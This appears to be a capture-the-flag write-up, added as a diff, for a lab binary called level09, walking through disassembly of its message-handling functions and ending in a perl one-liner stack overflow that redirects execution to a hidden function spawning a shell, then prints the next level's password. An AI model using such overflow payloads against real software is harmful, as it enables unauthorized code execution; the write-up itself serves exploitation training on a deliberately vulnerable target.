@@ -1,0 +1,100 @@
+1. ssh level09@192.168.56.101 -p 4242
+2. ls -la
+3. ./level09
+    Enter your username
+    >>: admin
+    >: Welcome, admin
+    >: Msg @Unix-Dude
+    >>: admin
+    >: Msg sent!
+
+4. scp -P 4242 level09@192.168.56.101:/home/users/level09/level09 .
+5. open /Application/IDA Freeware 7.7/ida64.app
+6. analyze level09 ELF binary ->
+    ...
+    call    handle_msg
+    ...
+    call    set_username
+    ...
+    call    set_msg
+    ...
+
+Stop... `system` function, where is it used?..
+
+Hmm, secret_backdoor function calls to system, but not used by any other function
+
+OK, we should be the callers :)
+
+Let's analyze potential vulnerabilities:
+Username saved in memory, maybe...
+    public handle_msg
+    ...
+    var_C0= byte ptr -0C0h ; 192 — RBP offset
+    ...
+    lea     rax, [rbp+var_C0]
+    add     rax, 8Ch ; 140 — msg struct buffer size
+    mov     qword ptr [rax], 0
+    mov     qword ptr [rax+8], 0
+    mov     qword ptr [rax+10h], 0
+    mov     qword ptr [rax+18h], 0
+    mov     qword ptr [rax+20h], 0
+    mov     [rbp+var_C], 8Ch
+    lea     rax, [rbp+var_C0]
+    mov     rdi, rax
+    ; Looks like msg struct
+    call    set_username
+    ...
+    call    set_msg
+    ...
+    call    _puts
+
+    public set_username
+    ...
+    mov     edx, 10h ; 16 — username buffer size
+    ...
+    mov     esi, 80h ; 128 — fgets buffer size
+    call    _fgets
+    
+    loc_A6A — loop
+    ...
+    cmp     [rbp+var_4], 28h ; 40 — for i in 0...40 equivalent
+    jg      short loc_A81
+
+    public set_msg
+    ...
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 410h ; 128 (rbp - 1040) — msg buffer size
+    ...
+    mov     esi, 400h ; 1024 — fgets buffer size
+    ...
+    call    _fgets
+    ...
+    call    _strncpy
+
+So, we can overwrite buffer with username and attack strncpy with long text
+
+7. Overwrite buffer and RSP (192 — RBP + 8 = 200)
+    secret_backdoor address
+    gdb level09
+    >> info function secret_backdoor
+
+0x000000000000088c
+
+8. PERL!
+
+(perl -e 'print "A" x 40 . "\xda" . "\n" . "A" x 200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "/bin/sh\n"'; cat) | ./level09
+
+    >> cat /home/users/end/.pass
+
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+HELL YEAH!!! GG !
+
+Congratulations
+
+Thanks for joining
+
+And
+
+BYE 👨‍❤️‍👨
